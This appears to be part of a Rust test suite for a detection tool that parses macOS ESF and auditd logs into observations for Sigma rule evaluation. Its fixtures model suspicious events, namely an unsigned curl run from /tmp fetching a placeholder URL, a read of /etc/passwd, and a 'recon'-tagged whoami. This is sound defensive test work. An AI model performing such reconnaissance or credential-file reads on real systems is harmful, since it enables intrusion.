        let ingest = parse(&fixture("esf-with-side-effects.jsonl"), Format::Esf).expect("parses");
        // curl's audit token pid is 4242, and so is the connect's — so the
        // connection attaches to the execution that made it.
        assert_eq!(ingest.observations.len(), 1);
        let curl = &ingest.observations[0];
        assert_eq!(
            curl.event.get("ProcessId").map(String::as_str),
            Some("4242")
        );
        assert_eq!(curl.side_effects.len(), 1);
        assert_eq!(curl.side_effects[0].class, "network");
        assert_eq!(
            curl.side_effects[0].detail,
            "network connection to 192.0.2.10:443"
        );
        // …and it does not also stand alone.
        assert!(
            !ingest
                .event_observations
                .iter()
                .any(|e| e.class == "network")
        );
    }

    #[test]
    fn esf_open_without_an_audit_token_still_becomes_an_observation() {
        // The base fixture predates audit tokens. Correlation is impossible
        // without a pid, but an uncorrelated event is kept, not dropped.
        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
        assert_eq!(ingest.event_observations.len(), 1);
        assert_eq!(ingest.event_observations[0].class, "file");
        assert_eq!(
            ingest.event_observations[0].detail,
            "file opened /etc/passwd"
        );
    }

    #[test]
    fn esf_carries_code_signing_fields() {
        // The signing context a command line can't supply rides along for
        // observed Sigma evaluation of macOS unsigned/third-party rules.
        let ev = r#"{"event":{"exec":{"target":{
            "executable":{"path":"/tmp/curl"},
            "signing_id":"com.example.tool","team_id":"ABCDE12345","is_platform_binary":false},
            "args":["curl","http://x/y"]}},"process":{"executable":{"path":"/bin/zsh"}}}"#;
        let ingest = parse(ev, Format::Esf).expect("parses");
        let event = &ingest.observations[0].event;
        assert_eq!(
            event.get("signing_id").map(String::as_str),
            Some("com.example.tool")
        );
        assert_eq!(event.get("team_id").map(String::as_str), Some("ABCDE12345"));
        assert_eq!(
            event.get("is_platform_binary").map(String::as_str),
            Some("false")
        );
    }

    #[test]
    fn auditd_carries_tty_and_key() {
        let log = "\
type=SYSCALL msg=audit(1.0:1): syscall=59 exe=\"/usr/bin/whoami\" tty=pts0 key=\"recon\"
type=EXECVE msg=audit(1.0:1): argc=1 a0=\"whoami\"
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        let event = &ingest.observations[0].event;
        assert_eq!(event.get("tty").map(String::as_str), Some("pts0"));
        assert_eq!(event.get("key").map(String::as_str), Some("recon"));
    }

    #[test]
    fn auditd_omits_placeholder_tty() {
        // A `(none)` tty is a placeholder, not a value — it must not be carried.
        let log = "\
type=SYSCALL msg=audit(1.0:1): syscall=59 exe=\"/usr/bin/whoami\" tty=(none)
type=EXECVE msg=audit(1.0:1): argc=1 a0=\"whoami\"
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        assert!(ingest.observations[0].event.get("tty").is_none());
    }

    #[test]
    fn empty_esf_input_is_a_clear_error() {
        assert!(parse("", Format::Esf).is_err());
        // A well-formed non-exec event yields zero observations (all skipped),
        // not an error.
        let open = r#"{"event":{"open":{"file":{"path":"/x"}}}}"#;
        let ingest = parse(open, Format::Esf).expect("parses");
        assert_eq!(ingest.observations.len(), 0);
        assert_eq!(ingest.skipped, 1);
    }
}
